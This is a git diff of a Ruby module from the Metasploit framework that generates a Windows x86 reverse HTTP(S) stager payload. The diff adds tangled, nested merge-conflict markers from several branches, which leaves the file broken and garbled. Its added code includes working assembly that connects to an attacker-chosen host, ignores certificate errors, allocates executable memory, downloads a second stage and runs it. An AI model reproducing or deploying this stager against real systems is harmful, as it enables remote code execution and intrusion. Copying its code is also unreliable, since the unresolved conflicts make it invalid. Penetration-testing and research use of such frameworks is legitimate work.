@@ -2,6 +2,9 @@
 
 require 'msf/core'
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> 4.11.2_release_pre-rails4
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
@@ -9,6 +12,7 @@ require 'msf/core/payload/uuid/options'
 
 module Msf
 
+<<<<<<< HEAD
 =======
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
@@ -17,6 +21,8 @@ module Msf
 
 
 >>>>>>> feature/complex-payloads
+=======
+>>>>>>> 4.11.2_release_pre-rails4
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
@@ -24,6 +30,9 @@ module Msf
 ###
 
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> 4.11.2_release_pre-rails4
 module Payload::Windows::ReverseHttp
 
   include Msf::Payload::TransportConfig
@@ -31,6 +40,7 @@ module Payload::Windows::ReverseHttp
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
   include Msf::Payload::UUID::Options
+<<<<<<< HEAD
 =======
 
 module Payload::Windows::ReverseHttp
@@ -38,6 +48,8 @@ module Payload::Windows::ReverseHttp
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
 >>>>>>> feature/complex-payloads
+=======
+>>>>>>> 4.11.2_release_pre-rails4
 
   #
   # Register reverse_http specific options
@@ -45,6 +57,9 @@ module Payload::Windows::ReverseHttp
   def initialize(*args)
     super
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> 4.11.2_release_pre-rails4
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
         OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
@@ -64,6 +79,7 @@ module Payload::Windows::ReverseHttp
   #
   # Generate the first stage
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
   def generate(opts={})
     conf = {
@@ -108,6 +124,31 @@ module Payload::Windows::ReverseHttp
     }
 
 >>>>>>> feature/complex-payloads
+=======
+  def generate(opts={})
+    conf = {
+      ssl:         opts[:ssl] || false,
+      host:        datastore['LHOST'],
+      port:        datastore['LPORT'],
+      retry_count: datastore['StagerRetryCount']
+    }
+
+    # Add extra options if we have enough space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:url]        = generate_uri
+      conf[:exitfunk]   = datastore['EXITFUNC']
+      conf[:ua]         = datastore['MeterpreterUserAgent']
+      conf[:proxy_host] = datastore['PayloadProxyHost']
+      conf[:proxy_port] = datastore['PayloadProxyPort']
+      conf[:proxy_user] = datastore['PayloadProxyUser']
+      conf[:proxy_pass] = datastore['PayloadProxyPass']
+      conf[:proxy_type] = datastore['PayloadProxyType']
+    else
+      # Otherwise default to small URIs
+      conf[:url]        = generate_small_uri
+    end
+
+>>>>>>> 4.11.2_release_pre-rails4
     generate_reverse_http(conf)
   end
 
@@ -137,6 +178,13 @@ module Payload::Windows::ReverseHttp
   def cached_size
     321
 >>>>>>> feature/complex-payloads
+  end
+
+  #
+  # Generate the transport-specific configuration
+  #
+  def transport_config(opts={})
+    transport_config_reverse_http(opts)
   end
 
   #
@@ -258,6 +306,7 @@ module Payload::Windows::ReverseHttp
 
     http_open_flags = 0
     secure_flags = 0
+<<<<<<< HEAD
 
     if opts[:ssl]
       http_open_flags = (
@@ -298,18 +347,28 @@ module Payload::Windows::ReverseHttp
     #
 
     http_open_flags = 0
+=======
+>>>>>>> 4.11.2_release_pre-rails4
 
     if opts[:ssl]
-        #;0x80000000 | ; INTERNET_FLAG_RELOAD
-        #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
-        #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
-        #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
-        #;0x00000200 | ; INTERNET_FLAG_NO_UI
-        #;0x00800000 | ; INTERNET_FLAG_SECURE
-        #;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
-        #;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
-      http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000 )
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 | # INTERNET_FLAG_NO_UI
+        0x00800000 | # INTERNET_FLAG_SECURE
+        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 ) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+
+      secure_flags = (
+        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
+        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
     else
+<<<<<<< HEAD
       #;0x80000000 | ; INTERNET_FLAG_RELOAD
       #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
       #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
@@ -317,6 +376,14 @@ module Payload::Windows::ReverseHttp
       #;0x00000200   ; INTERNET_FLAG_NO_UI
       http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
 >>>>>>> feature/complex-payloads
+=======
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 ) # INTERNET_FLAG_NO_UI
+>>>>>>> 4.11.2_release_pre-rails4
     end
 
     asm = %Q^
@@ -491,6 +558,7 @@ module Payload::Windows::ReverseHttp
 
       send_request:
     ^
+<<<<<<< HEAD
 
     if opts[:ssl]
       asm << %Q^
@@ -528,6 +596,22 @@ module Payload::Windows::ReverseHttp
           call ebp
         ^
 >>>>>>> feature/complex-payloads
+=======
+
+    if opts[:ssl]
+      asm << %Q^
+      ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
+      set_security_options:
+        push 0x#{secure_flags.to_s(16)}
+       mov eax, esp
+        push 4                 ; sizeof(dwFlags)
+        push eax               ; &dwFlags
+        push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
+        push esi               ; hHttpRequest
+        push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
+>>>>>>> 4.11.2_release_pre-rails4
     end
 
     asm << %Q^
@@ -548,6 +632,9 @@ module Payload::Windows::ReverseHttp
 
       ; if we didn't allocate before running out of retries, bail out
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> 4.11.2_release_pre-rails4
     ^
 
     if opts[:exitfunk]
@@ -560,6 +647,7 @@ module Payload::Windows::ReverseHttp
     failure:
       push 0x56A2B5F0        ; hardcoded to exitprocess for size
       call ebp
+<<<<<<< HEAD
       ^
     end
 
@@ -612,21 +700,60 @@ module Payload::Windows::ReverseHttp
     end
 
 =======
+=======
+>>>>>>> 4.11.2_release_pre-rails4
       ^
+    end
 
-      if opts[:exitfunk]
-        asm << %Q^
-          failure:
-            call exitfunk
-          ^
-      else
-        asm << %Q^
-          failure:
-            push 0x56A2B5F0        ; hardcoded to exitprocess for size
-            call ebp
-          ^
-      end
+    asm << %Q^
+    allocate_memory:
+      push 0x40              ; PAGE_EXECUTE_READWRITE
+      push 0x1000            ; MEM_COMMIT
+      push 0x00400000        ; Stage allocation (4Mb ought to do us)
+      push ebx               ; NULL as we dont care where the allocation is
+      push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
+    download_prep:
+      xchg eax, ebx          ; place the allocated base address in ebx
+      push ebx               ; store a copy of the stage base address on the stack
+      push ebx               ; temporary storage for bytes read count
+      mov edi, esp           ; &bytesRead
+
+    download_more:
+      push edi               ; &bytesRead
+      push 8192              ; read length
+      push ebx               ; buffer
+      push esi               ; hRequest
+      push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
+      call ebp
+
+      test eax,eax           ; download failed? (optional?)
+      jz failure
+
+      mov eax, [edi]
+      add ebx, eax           ; buffer += bytes_received
+
+      test eax,eax           ; optional?
+      jnz download_more      ; continue until it returns 0
+      pop eax                ; clear the temporary storage
+
+    execute_stage:
+      ret                    ; dive into the stored stage address
+
+    got_server_uri:
+      pop edi
+      call got_server_host
+
+    server_host:
+      db "#{opts[:host]}", 0x00
+    ^
+
+    if opts[:exitfunk]
+      asm << asm_exitfunk(opts)
+    end
+
+<<<<<<< HEAD
       asm << %Q^
         allocate_memory:
           push.i8 0x40           ; PAGE_EXECUTE_READWRITE
@@ -675,6 +802,8 @@ module Payload::Windows::ReverseHttp
         asm << asm_exitfunk(opts)
       end
 >>>>>>> feature/complex-payloads
+=======
+>>>>>>> 4.11.2_release_pre-rails4
     asm
   end
 
@@ -693,9 +822,12 @@ module Payload::Windows::ReverseHttp
   end
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 
 >>>>>>> feature/complex-payloads
+=======
+>>>>>>> 4.11.2_release_pre-rails4
 end
 
 end
